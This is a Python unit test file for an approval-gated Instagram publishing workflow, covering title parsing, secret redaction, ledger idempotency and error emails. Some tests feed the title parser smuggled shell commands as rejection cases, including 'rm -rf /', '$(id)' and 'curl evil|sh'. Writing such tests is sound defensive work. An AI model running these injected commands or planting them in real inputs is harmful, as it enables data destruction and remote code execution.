import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import draft
import publish
from core import approval, http, ledger
from channels import instagram

os.environ.update(GITHUB_REPOSITORY="o/r", GITHUB_REF_NAME="main", RESEND_API_KEY="x" * 12,
                  RESEND_FROM="a@b.c", RESEND_TO="d@e.f")


def fake_update(mutator, message, extra_paths=(), attempts=4):
    data = ledger.load()
    mutator(data)
    ledger.save(data)
    return data


class InTmp(unittest.TestCase):
    def setUp(self):
        self._cwd = os.getcwd()
        self._tmp = tempfile.TemporaryDirectory()
        os.chdir(self._tmp.name)
        p = mock.patch.object(ledger, "update", fake_update)
        p.start()
        self.addCleanup(p.stop)
        self.addCleanup(self._tmp.cleanup)
        self.addCleanup(os.chdir, self._cwd)


class TitleParsing(unittest.TestCase):
    def test_valid(self):
        self.assertEqual(publish.parse_title("approve:my-post-1:ig"), ("approve", "my-post-1", ["ig"]))
        self.assertEqual(publish.parse_title("approve:x:ig+fb")[2], ["ig", "fb"])
        self.assertEqual(publish.parse_title("reject:x:pin")[0], "reject")

    def test_rejects_everything_else(self):
        bad = [
            "", "approve:x:tiktok", "approve:X:ig", "approve:a b:ig", "approve:x:ig\n",
            "approve:x:ig; rm -rf /", "approve:$(id):ig", "approve:x:ig`id`",
            "approve:x:ig\napprove:y:ig", "publish:x:ig", "approve::ig", "approve:äö:ig",
        ]
        for title in bad:
            with self.assertRaises(ValueError, msg=title):
                publish.parse_title(title)

    def test_every_email_button_passes_the_workflow_regex(self):
        for action in ("approve", "reject"):
            link = approval.approval_link(action, "some-post", "ig")
            self.assertIn("labels=approval", link)
            self.assertIn(f"title={action}%3Asome-post%3Aig", link)
        self.assertIn("ig%2Bfb", approval.approval_link("approve", "p", "ig+fb"))

    def test_link_for_unusable_handle_fails_at_draft_time(self):
        with self.assertRaises(ValueError):
            approval.approval_link("approve", "Bettwäsche", "ig")


class Redaction(unittest.TestCase):
    def test_secret_values_never_survive(self):
        with mock.patch.dict(os.environ, {"ACCESS_TOKEN": "EAAB-secret-token-123"}):
            self.assertNotIn("secret-token", http.redact("GET https://x?access_token=EAAB-secret-token-123"))


class DraftSelection(InTmp):
    def art(self, i, handle, pub=True):
        return {"id": i, "handle": handle, "isPublished": pub}

    def test_skips_legacy_ledger_and_unpublished(self):
        arts = [self.art("1", "a"), self.art("2", "b"), self.art("3", "c"), self.art("4", "d", pub=False)]
        picked = draft.select_new_articles(arts, {"b": {"ig": {}}}, {"1"})
        self.assertEqual([a["handle"] for a in picked], ["c"])


class Approve(InTmp):
    def seed(self, status="draft", **extra):
        data = {"post": {"ig": {"status": status, "post_id": None, "url": None, **extra}}}
        ledger.save(data)
        ledger.write_draft("post", "ig", {"full_caption": "cap", "article_url": "https://u", "image_url": "i"})

    def test_publish_writes_ledger_and_is_idempotent(self):
        self.seed()
        fake = mock.Mock()
        fake.publish.return_value = {"post_id": "9", "url": "https://ig/p/9", "timestamp": "t"}
        fake.after_publish.return_value = "redirect ok"
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            line, ok = publish.do_approve("post", "ig")
            self.assertTrue(ok)
            entry = ledger.load()["post"]["ig"]
            self.assertEqual((entry["status"], entry["post_id"], entry["url"]), ("published", "9", "https://ig/p/9"))
            line, ok = publish.do_approve("post", "ig")  # second run
        self.assertTrue(ok)
        self.assertIn("already published", line)
        fake.publish.assert_called_once()

    def test_publishing_state_blocks_retry(self):
        self.seed("publishing", container_id="c1")
        fake = mock.Mock()
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            _, ok = publish.do_approve("post", "ig")
        self.assertFalse(ok)
        fake.publish.assert_not_called()

    def test_rejected_and_unimplemented(self):
        self.seed("rejected")
        fake = mock.Mock()
        with mock.patch.dict(publish.CHANNELS, {"ig": fake}):
            self.assertFalse(publish.do_approve("post", "ig")[1])
        self.assertFalse(publish.do_approve("post", "fb")[1])
        fake.publish.assert_not_called()

    def test_reject_marks_ledger_and_never_publishes(self):
        self.seed()
        publish.do_reject("post", "ig")
        self.assertEqual(ledger.load()["post"]["ig"]["status"], "rejected")

    def test_reject_does_not_touch_published(self):
        self.seed("published", url="https://ig/p/1")
        publish.do_reject("post", "ig")
        self.assertEqual(ledger.load()["post"]["ig"]["status"], "published")


class MainFlow(InTmp):
    env = {"TITLE": "approve:post:ig", "ACCESS_TOKEN": "bad-token-xxxx", "IG_USER_ID": "1",
           "SHOPIFY_STORE_DOMAIN": "s", "SHOPIFY_CLIENT_ID": "c", "SHOPIFY_CLIENT_SECRET": "s",
           "BIO_LINK_PATH": "/p"}

    def test_platform_error_sends_failure_email_with_raw_text_and_stays_draft(self):
        ledger.save({"post": {"ig": {"status": "draft"}}})
        ledger.write_draft("post", "ig", {"full_caption": "c", "article_url": "u", "image_url": "i"})
        err = http.ApiError('ig-create-container failed: HTTP 400: {"error":{"message":"Invalid OAuth access token"}}')
        result = Path("result.md")
        with mock.patch.dict(os.environ, {**self.env, "RESULT_FILE": str(result)}), \
                mock.patch.object(instagram, "create_container", side_effect=err), \
                mock.patch.object(approval, "_send") as send:
            with self.assertRaises(SystemExit):
                publish.main()
        subject, body = send.call_args[0]
        self.assertIn("[FAILED]", subject)
        self.assertIn("Invalid OAuth access token", body)
        self.assertIn("Invalid OAuth access token", result.read_text(encoding="utf-8"))
        self.assertEqual(ledger.load()["post"]["ig"]["status"], "draft")

    def test_malicious_title_fails_before_any_work(self):
        with mock.patch.dict(os.environ, {**self.env, "TITLE": "approve:x:ig; curl evil|sh"}), \
                mock.patch.object(approval, "_send") as send:
            with self.assertRaises(SystemExit):
                publish.main()
        send.assert_not_called()


class InstagramPublish(unittest.TestCase):
    def test_definite_publish_error_reverts_but_ambiguous_does_not(self):
        env = {"ACCESS_TOKEN": "t" * 12, "IG_USER_ID": "1"}
        draft_ = {"full_caption": "c", "image_url": "i"}
        calls = []
        with mock.patch.dict(os.environ, env), \
                mock.patch.object(instagram, "create_container", return_value="c1"), \
                mock.patch.object(instagram, "wait_until_ready"), \
                mock.patch.object(http, "request", side_effect=http.ApiError("boom")):
            with self.assertRaises(http.ApiError):
                instagram.publish(draft_, lambda c: calls.append("mark"), lambda: calls.append("revert"))
        self.assertEqual(calls, ["mark", "revert"])

        calls.clear()
        with mock.patch.dict(os.environ, env), \
                mock.patch.object(instagram, "create_container", return_value="c1"), \
                mock.patch.object(instagram, "wait_until_ready"), \
                mock.patch.object(http, "request", side_effect=TimeoutError("read timed out")):
            with self.assertRaises(TimeoutError):
                instagram.publish(draft_, lambda c: calls.append("mark"), lambda: calls.append("revert"))
        self.assertEqual(calls, ["mark"])


if __name__ == "__main__":
    unittest.main()
